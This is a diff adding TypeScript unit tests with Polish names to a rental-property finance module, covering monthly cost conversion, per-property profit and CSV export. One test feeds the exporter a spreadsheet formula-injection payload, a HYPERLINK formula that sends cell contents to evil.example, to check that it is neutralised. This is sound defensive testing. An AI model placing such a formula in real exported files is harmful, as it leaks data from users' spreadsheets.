@@ -4,6 +4,7 @@ import {
   buildCsv,
   collectionStats,
   monthlyBreakdown,
+  monthlyCost,
   propertyBreakdown,
   toCsvAmount,
   type CashEntry,
@@ -54,6 +55,41 @@ describe("monthlyBreakdown", () => {
 
     expect(rows[0]?.incomeGrosze).toBe(100000);
     expect(rows[11]?.incomeGrosze).toBe(0);
+  });
+});
+
+describe("monthlyCost", () => {
+  it("przelicza koszt cykliczny na miesiąc", () => {
+    expect(monthlyCost(50000, "MONTHLY", null)).toBe(50000);
+    expect(monthlyCost(120000, "YEARLY", null)).toBe(10000);
+    // Średni miesiąc to ~4,35 tygodnia, nie 4.
+    expect(monthlyCost(7000, "WEEKLY", null)).toBe(30417);
+    expect(monthlyCost(9000, "CUSTOM", 90)).toBe(3042);
+  });
+});
+
+describe("propertyBreakdown — kwoty bieżące", () => {
+  const names = new Map([
+    ["p1", "Długa 14"],
+    ["p2", "Krótka 3"],
+  ]);
+
+  it("liczy miesięczny zysk i pokazuje nieruchomość bez ruchu w roku", () => {
+    const rows = propertyBreakdown([entry(1, 240000, "p1")], [], names, labels, {
+      income: [
+        { propertyId: "p1", amountGrosze: 250000 },
+        { propertyId: "p2", amountGrosze: 180000 },
+      ],
+      expenses: [{ propertyId: "p1", amountGrosze: 60000 }],
+    });
+
+    const p1 = rows.find((row) => row.propertyId === "p1")!;
+    expect(p1.monthlyProfitGrosze).toBe(190000);
+    expect(p1.profitGrosze).toBe(240000);
+
+    const p2 = rows.find((row) => row.propertyId === "p2")!;
+    expect(p2.incomeGrosze).toBe(0);
+    expect(p2.monthlyIncomeGrosze).toBe(180000);
   });
 });
 
@@ -196,5 +232,24 @@ describe("CSV", () => {
   it("cytuje komórki ze średnikiem i cudzysłowem", () => {
     const csv = buildCsv(["A"], [['Remont; łazienka "duża"']]);
     expect(csv).toContain('"Remont; łazienka ""duża"""');
+  });
+
+  it("rozbraja komórki, które Excel wziąłby za formułę", () => {
+    const csv = buildCsv(["A"], [
+      ['=HYPERLINK("https://evil.example?"&A1,"Faktura")'],
+      ["+48 600 100 200"],
+      ["@SUM(A1:A9)"],
+      ["-cmd"],
+    ]);
+    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example?""&A1,""Faktura"")"`);
+    expect(csv).toContain("'+48 600 100 200");
+    expect(csv).toContain("'@SUM(A1:A9)");
+    expect(csv).toContain("'-cmd");
+  });
+
+  it("zostawia ujemne kwoty liczbami", () => {
+    const csv = buildCsv(["A"], [["-12,00"], ["-7.5"]]);
+    expect(csv).toContain("\r\n-12,00\r\n");
+    expect(csv).toContain("\r\n-7.5\r\n");
   });
 });
